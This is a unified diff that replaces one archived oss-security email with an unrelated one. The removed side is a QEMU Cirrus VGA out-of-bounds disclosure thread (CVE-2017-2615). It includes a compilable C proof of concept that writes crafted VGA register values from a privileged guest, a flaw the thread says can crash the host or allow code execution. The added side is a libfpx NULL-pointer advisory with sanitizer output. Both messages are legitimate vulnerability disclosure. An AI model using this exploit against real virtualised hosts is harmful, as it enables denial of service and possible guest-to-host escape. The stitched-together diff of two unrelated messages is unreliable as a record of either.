@@ -1,140 +1,91 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/22/1
-Message-ID: <143C0AFC63FC204CB0C55BB88F3A8ABB33336204@EX02.corp.qihoo.net>
-Date: Wed, 22 Feb 2017 03:43:06 +0000
-From: 李强 <liqiang6-s@....cn>
-To: oss security list <oss-security@...ts.openwall.com>
-CC: P J P <ppandit@...hat.com>
-Subject: RE: CVE-2017-2615 Qemu: display: cirrus: oob access while doing bitblt copy backward mode
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/17/12
+Message-ID: <277948.13792886-sendEmail@localhost>
+Date: Thu, 17 Aug 2017 20:17:33 +0000
+From: "Agostino Sarubbo" <ago@...too.org>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: libfpx: NULL pointer dereference in CDirectory::GetDirEntry (dir.cxx)
 Content-Type: text/plain; charset=utf-8
 
-FYI
+Description:
+libfpx is a library for manipulating FlashPIX images.
 
-The PoC for this is below:
+I’m aware that the link to the upstream website does not work. I’m keeping it as well because in the future the upstream website could appear 
+again.
+Libfpx is not actively developed, I contacted the imagemagick project if they were available to patch security issues, but they said the they 
+are only accepting patches and push new releases.
+This issue was found using the gm command line tool of graphicsmagick.
 
-/*
- *  CVE-2017-2615 PoC
- *
- *  Qiang Li of the Gear Team, Qihoo 360 Inc.
- *
- *  #gcc poc.c -o poc
- *  #./poc
- *
-*/
-#include <sys/io.h>
-#include <stdio.h>
+The complete ASan output of the issue:
 
-void write_sr(int idx,int val)
-{
-      outb(idx,0x3c4);
-	outb(val,0x3c5);
-}
-void write_gr(int idx,int val)
-{
-	outb(idx,0x3ce);
-	outb(val,0x3cf);
-}
+# gm identify $FILE
+ASAN:DEADLYSIGNAL
+=================================================================
+==11276==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000258 (pc 0x7f508f88a3f5 bp 0x000000000007 sp 0x7fffbde029f0 T0)
+==11276==The signal is caused by a READ memory access.
+==11276==Hint: address points to the zero page.
+    #0 0x7f508f88a3f4 in CDirectory::GetDirEntry(unsigned int, unsigned int, CDirEntry**) /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/oless/dir.cxx:1097
+    #1 0x7f508f88a64e in CDirectory::SetSize(unsigned int, unsigned int) /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/oless/dir.cxx:437
+    #2 0x7f508f89440a in CDirectStream::WriteAt(unsigned int, void const*, unsigned int, unsigned int*) /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/oless/sstream.cxx:367
+    #3 0x7f508f88e7cd in CExposedStream::Write(void const*, unsigned int, unsigned int*) /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/oless/expst.cxx:206
+    #4 0x7f508f875a3e in OLEStream::Write(void const*, unsigned long) /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/ole/olestrm.cpp:143
+    #5 0x7f508f875119 in OLEStream::WriteVT_I4(unsigned int*) /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/ole/olestrm.cpp:1370
+    #6 0x7f508f872ded in OLEPropertySection::Write() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/ole/oleprops.cpp:476
+    #7 0x7f508f873101 in OLEPropertySet::Commit() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/ole/oleprops.cpp:131
+    #8 0x7f508f84da36 in PFlashPixFile::Commit() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/fpx/fpxformt.cpp:581
+    #9 0x7f508f84da8f in PFlashPixFile::~PFlashPixFile() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/fpx/fpxformt.cpp:276
+    #10 0x7f508f84db78 in PFlashPixFile::~PFlashPixFile() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/fpx/fpxformt.cpp:306
+    #11 0x7f508f879ed3 in PHierarchicalImage::~PHierarchicalImage() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/ri_image/ph_image.cpp:168
+    #12 0x7f508f849c38 in PFileFlashPixIO::~PFileFlashPixIO() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/fpx/f_fpxio.cpp:277
+    #13 0x7f508f8536a5 in PFlashPixImageView::~PFlashPixImageView() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/fpx/fpximgvw.cpp:519
+    #14 0x7f508f8536b8 in PFlashPixImageView::~PFlashPixImageView() /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/fpx/fpximgvw.cpp:532
+    #15 0x7f508f85529e in FPX_CloseImage /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/fpx/fpxlibio.cpp:766
+    #16 0x7f508fac7bf4 in ReadFPXImage /var/tmp/portage/media-gfx/graphicsmagick-1.3.26/work/GraphicsMagick-1.3.26/coders/fpx.c:344:14
+    #17 0x7f5095333e2b in ReadImage /var/tmp/portage/media-gfx/graphicsmagick-1.3.26/work/GraphicsMagick-1.3.26/magick/constitute.c:1607:13
+    #18 0x7f5095330e8c in PingImage /var/tmp/portage/media-gfx/graphicsmagick-1.3.26/work/GraphicsMagick-1.3.26/magick/constitute.c:1370:9
+    #19 0x7f50951fcae5 in IdentifyImageCommand /var/tmp/portage/media-gfx/graphicsmagick-1.3.26/work/GraphicsMagick-1.3.26/magick/command.c:8379:17
+    #20 0x7f5095203065 in MagickCommand /var/tmp/portage/media-gfx/graphicsmagick-1.3.26/work/GraphicsMagick-1.3.26/magick/command.c:8869:17
+    #21 0x7f50952ae7fb in GMCommandSingle /var/tmp/portage/media-gfx/graphicsmagick-1.3.26/work/GraphicsMagick-1.3.26/magick/command.c:17396:10
+    #22 0x7f50952ab931 in GMCommand /var/tmp/portage/media-gfx/graphicsmagick-1.3.26/work/GraphicsMagick-1.3.26/magick/command.c:17449:16
+    #23 0x7f5093b16680 in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.23-r4/work/glibc-2.23/csu/../csu/libc-start.c:289
+    #24 0x419cd8 in _init (/usr/bin/gm+0x419cd8)
 
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV /var/tmp/portage/media-libs/libfpx-1.3.1_p6/work/libfpx-1.3.1-6/oless/dir.cxx:1097 in CDirectory::GetDirEntry(unsigned int, unsigned int, CDirEntry**)
+==11276==ABORTING
 
-int main()
-{
-	iopl(3);
-	write_sr(0x07,1);
-	write_gr(0x31,0x80);
-	write_gr(0x26,0xff);
-	write_gr(0x27,0xff);
-	write_gr(0x24,1);
-	write_gr(0x20,0xff);
-	write_gr(0x21,0xff);
-	write_gr(0x22,0x0);
-	write_gr(0x23,0x0);
+Affected version:
+1.3.1_p6
 
-	write_gr(0x28,0);
-	write_gr(0x29,0);
-	write_gr(0x2a,0);
-	write_gr(0x2c,0xff);
-	write_gr(0x2d,0xff);
-	write_gr(0x2e,0xff);
+Fixed version:
+N/A
 
-	write_gr(0x30,1);
-	write_gr(0x2a,0);
+Commit fix:
+N/A
 
-    return 0;
-}
+Credit:
+This bug was discovered by Agostino Sarubbo of Gentoo.
 
+CVE:
+CVE-2017-12920
 
-Thanks.
+Reproducer:
+https://github.com/asarubbo/poc/blob/master/00308-libfpx-NULLptr-CDirectory_GetDirEntry
+
+Timeline:
+2017-08-01: bug discovered
+2017-08-09: blog post about the issue
+2017-08-17: CVE assigned
+
+Note:
+This bug was found with American Fuzzy Lop.
+This bug was identified with bare metal servers donated by Packet. This work is also supported by the Core Infrastructure Initiative.
+
+Permalink:
+https://blogs.gentoo.org/ago/2017/08/09/libfpx-null-pointer-dereference-in-cdirectorygetdirentry-dir-cxx/
 
 --
-Li Qiang / the Gear Team, Qihoo 360 Inc
+Agostino Sarubbo
+Gentoo Linux Developer
 
-> -----Original Message-----
-> From: 李强
-> Sent: Monday, February 13, 2017 8:22 PM
-> To: oss security list
-> Cc: 'P J P'
-> Subject: RE: CVE-2017-2615 Qemu: display: cirrus: oob access while doing bitblt
-> copy backward mode
-> 
-> Hello all,
-> 
-> This is Li Qiang from the Gear Team, Qihoo 360 inc. I have discovered this
-> vulnerability and make a patch for this, though not complete. When I send
-> patch to fix this issue, I did know the Cirrus vga is not the default vga in qemu.
-> So I just treat this as a normal issue. But afterwards we discovered that the
-> libvirt and xen use this vga as default.
-> We tested a lot of cloud platform in China, every of them uses the Cirrus vga as
-> default. Most of them is affected by this issue. The only one doesn't be affected
-> I think have fixed this issue. So we think this issue should be got more attention.
-> We strongly commend every cloud platform treat this issue seriously. Though
-> this vulnerability has been fixed for 10+ days, For responsible vulnerability
-> disclosure, we will not public the PoC in this email. The PoC will be public later.
-> 
-> Thanks.
-> 
-> --
-> Li Qiang / the Gear Team, Qihoo 360 Inc.
-> 
-> 
-> > -----Original Message-----
-> > From: P J P [mailto:ppandit@...hat.com]
-> > Sent: Wednesday, February 01, 2017 5:50 PM
-> > To: oss security list
-> > Cc: 李强
-> > Subject: CVE-2017-2615 Qemu: display: cirrus: oob access while doing
-> > bitblt copy backward mode
-> >
-> >    Hello,
-> >
-> > Quick emulator(Qemu) built with the Cirrus CLGD 54xx VGA Emulator
-> > support is vulnerable to an out-of-bounds access issue. It could occur
-> > while copying VGA data via bitblt copy in backward mode.
-> >
-> > A privileged user inside guest could use this flaw to crash the Qemu
-> > process resulting in DoS OR potentially execute arbitrary code on the
-> > host with privileges of Qemu process on the host.
-> >
-> > Upstream patch
-> > --------------
-> >    ->
-> > https://lists.gnu.org/archive/html/qemu-devel/2017-02/msg00015.html
-> >
-> > It fixes
-> >    ->
-> >
-> http://git.qemu.org/?p=qemu.git;a=commit;h=d3532a0db02296e687711b8cdc
-> > 7791924efccea0
-> >
-> > Reference:
-> > ----------
-> >    -> https://bugzilla.redhat.com/show_bug.cgi?id=1418200
-> >
-> > This issue was reported by Li Qiang of 360.cn Inc.
-> >
-> > CVE-2017-2615 was assigned to this issue by Red Hat Inc.
-> >
-> > Thank you.
-> > --
-> > Prasad J Pandit / Red Hat Product Security Team 47AF CE69 3A90 54AA
-> > 9045
-> > 1053 DD13 3D32 FE5B 041F
+
